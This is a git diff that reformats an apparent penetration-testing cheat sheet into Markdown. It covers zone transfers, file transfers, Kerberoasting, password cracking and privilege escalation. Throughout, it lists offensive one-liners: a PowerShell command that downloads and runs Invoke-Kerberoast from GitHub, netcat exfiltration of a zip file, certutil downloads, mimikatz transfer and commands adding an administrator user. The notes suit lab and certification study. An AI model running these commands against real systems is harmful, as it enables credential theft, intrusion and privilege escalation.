@@ -15,11 +15,11 @@ Credit Info:
 I have obtained a lot of this info through other Github repos, blogs, sites and more.
 I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz
 
-Active Directory & Domain Controllers
+## Active Directory & Domain Controllers
 ----------------
 - WIP
 
-BOF (WIP)
+## BOF (WIP)
 ----------------
 (Bad Characters: 0x00, 0x0A)
 - Fuzzing
@@ -29,67 +29,90 @@ BOF (WIP)
 - Generating payload with msfvenom
 - Getting reverse shell with netcat
 
-DNS - Zone Transfers
+## DNS - Zone Transfers
 ----------------
 - host -t axfr HTB.local 10.10.10.10
 - host -l HTB.local 10.10.10.10
 - host -l <domain name> <name server>
 - dig @<dns server> <domain> axfr
 
-File Transfers
+## File Transfers
 ----------------
+
 #Wget Transfer
+
 How to retrieve file(s) from host (inside a reverse shell)
 
-	1. Place file you want transferred in /var/www/html/
-	2. # service apache2 start
-	3. # wget http://10.10.10/pspy64 <- for single file
-  	4. # wget -r http://10.10.10.10/pspy64/ <- for folder
+```bash
+# Place file you want transferred in /var/www/html/
+service apache2 start
+# Run on the remote server
+# wget http://10.10.10.10/pspy64 # <- for single file
+# wget -r http://10.10.10.10/pspy64/ <- for folder
+```
 	
 #TFTP Transfer
-(How to transfer from Kali to Windows)
-Using MSF. Start MSF before starting these steps:
 
-	1. use auxiliary/server/tftp
-	2. set TFTPROOT /usr/share/mimikatz/Win32/
-	3. run
-  	4. tftp -i 10.10.10.10 GET mimikatz.exe
+(How to transfer from Kali to Windows)
+
+Using MSF.
+
+Start MSF before these steps:
+
+Inside MSF
+
+1. `use auxiliary/server/tftp`
+2. `set TFTPROOT /usr/share/mimikatz/Win32/`
+3. `run`
+
+Inside a terminal
+
+4. `tftp -i 10.10.10.10 GET mimikatz.exe`
 
 #NC (Windows to Kali)
 
-	Windows:
-	1. nc -nv 10.11.0.61 4444 < bank-account.zip
-	
-	Linux:
-	2. nc -nlvp 4444 > bank-account.zip
+1. Windows: `nc -nv 10.11.0.61 4444 < bank-account.zip`
+
+2. Linux: `nc -nlvp 4444 > bank-account.zip`
 	
 #Powershell
 
-```Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py```
+```ps
+Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
+```
 	
-	Without an interactive powershell session:
-	```
-	   Create wget.ps1
-	   $client = New-Object System.Net.WebClient
-	   $path = "C:\path\to\save\file.txt"
-	   $client.DownloadFile($url, $path)
-	```
-#Base64
+Without an interactive powershell session:
+```ps
+# Create wget.ps1
+$client = New-Object System.Net.WebClient
+$path = "C:\path\to\save\file.txt"
+$client.DownloadFile($url, $path)
+```
+#Base64 (Linux -> Linux)
 
-	local system:
-	1. cat exploit.py | base64
-	
-	victim:
-	2. echo "base64string==" | base64 -d >> exploit.py
+Local Host:
+1. `$(echo "cat /path/to/exploit.py | base64") > encoded.b64`
+2. Transfer `encoded.b64` to the remote server via `nc` or otherwise.
+
+Remote Server - Linux:
+
+3. `cat /path/to/encoded.b64 | base64 -d > exploit.py`
+
+Remove Server - Powershell 
 	
 #Certutil
-	```certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip```
+
+```
+certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
+```
 
 Kerberoasting
 ----------------
-- GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>
-- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
-- impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER> -outputfile filename.hashes
+- `GetUserSPNs.py -request -dc-ip <DC_IP> <domain\user>`
+
+- `powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`
+
+- `impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER> -outputfile filename.hashes`
 
 LFI / RFI
 ----------------
@@ -107,60 +130,58 @@ MSSQL / SQLi
 Password Cracking
 ----------------
 #Hashcat
-- user:$1$AbCdEf123/:16903:0:99999:7::: 
-- hashcat -m 500 -a 0 -o cracked_password.txt --force MD5_hash.txt /usr/share/wordlists/rockyou.txt
+- `hashcat -m 500 -a 0 -o cracked_password.txt --force hash.txt /path/to/your/wordlist.txt`
 
-#John
-- user:$1$AbCdEf123/:16903:0:99999:7::: 
-- john --rules --wordlist=/usr/share/wordlists/rockyou.txt MD5_hash.txt
+#John The Ripper
+- `john --rules --wordlist=/path/to/your/wordlist.txt hash.txt`
 
 Password Spraying (CrackMapExec)
 ----------------
-cme smb 10.10.10.10 -u username -d domain -p password
+- `cme smb 10.10.10.10 -u username -d domain -p password`
 
 Payload Generation
 ----------------
-- https://netsec.ws/?p=331
-- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
-- https://www.offensive-security.com/metasploit-unleashed/payloads/
-- https://github.com/swisskyrepo/PayloadsAllTheThings
-- non staged = netcat
-- staged = multi/handler
+- [NETSEC - Creating Payloads](https://netsec.ws/?p=331)
+- [MsfVenom Cheatsheet](http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/_)
+- [Metasploit Unleashed Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- Non-staged: netcat
+- Staged: multi/handler
 
 PHP
 ----------------
-- https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1
+- [The differences between `exec()`, `shell_exec`, `system()` and `passthru()`](https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1)
 
 
 Priv Esc - Linux
 ----------------
 # If GCC & wget is installed, the system MIGHT be vulnerable to a kernel exploit
-- https://github.com/SecWiki/linux-kernel-exploits
-- https://gtfobins.github.io
-- https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
-- https://github.com/jondonas/linux-exploit-suggester-2
-- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-- grep -Ri 'password' .
-- find / -perm –4000 2>/dev/null
-- find / -perm -u=s 2>/dev/null
-- find / -user root -perm -4000 -exec ls -ldb {} \;
-- which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+- [Linux Kernel Exploits](https://github.com/SecWiki/linux-kernel-exploits)
+- [GTFObins - Break ~~the f**k~~ out of restricted shells](https://gtfobins.github.io)
+- [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
+- [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
+- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+- `grep -Ri 'password' .`
+- `find / -perm –4000 2>/dev/null`
+- `find / -perm -u=s 2>/dev/null`
+- `find / -user root -perm -4000 -exec ls -ldb {} \;`
+- `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
 (then ls -la, look for 777 file permissions).
 
 Priv Esc - Windows
 ----------------
- - http://www.fuzzysecurity.com/tutorials/16.html
- - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
- - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc (PowerUp)
- - https://github.com/M4ximuss/Powerless
- - https://github.com/sagishahar/lpeworkshop
- - https://github.com/411Hall/JAWS
- - https://github.com/rasta-mouse/Watson
- - https://github.com/rasta-mouse/Sherlock (Deprecated)
- - https://github.com/GDSSecurity/Windows-Exploit-Suggester
- - churrasco -d "net user /add <username> <password>"
- - churrasco -d "net localgroup administrators <username> /add"
- - churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
+ - [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
+ - [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+ - [PowerUp / PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+ - [Powerless - Enumeration Tool](https://github.com/M4ximuss/Powerless)
+ - [Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
+ - [Just Another Windows (Enum) Script / JAWS](https://github.com/411Hall/JAWS)
+ - [Watson](https://github.com/rasta-mouse/Watson)
+ - [Sherlock](https://github.com/rasta-mouse/Sherlock) (Deprecated)
+ - [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+ - `churrasco -d "net user /add <username> <password>"`
+ - `churrasco -d "net localgroup administrators <username> /add"`
+ - `churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"`
 
 Post Exploitation
 ----------------
